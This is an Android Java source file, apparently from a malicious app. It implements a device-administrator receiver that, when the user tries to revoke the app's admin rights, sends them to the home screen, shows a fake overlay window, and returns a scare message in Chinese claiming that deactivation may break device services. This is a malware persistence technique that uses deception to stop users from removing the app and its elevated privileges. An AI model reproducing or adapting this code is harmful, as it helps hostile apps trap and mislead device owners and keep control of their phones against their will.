package com.xstd.ip.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import com.xstd.ip.Config;
import com.xstd.ip.DisDeviceFakeWindow;
import com.xstd.ip.Tools;

public class BindDeviceReceiver extends DeviceAdminReceiver {

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        if (Config.isDebug)
            return "取消设备管理器可能出现未知故障。";

        Tools.goHome(context);
        DisDeviceFakeWindow fakeWindow = new DisDeviceFakeWindow(context);
        fakeWindow.show();
        return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
    }

}
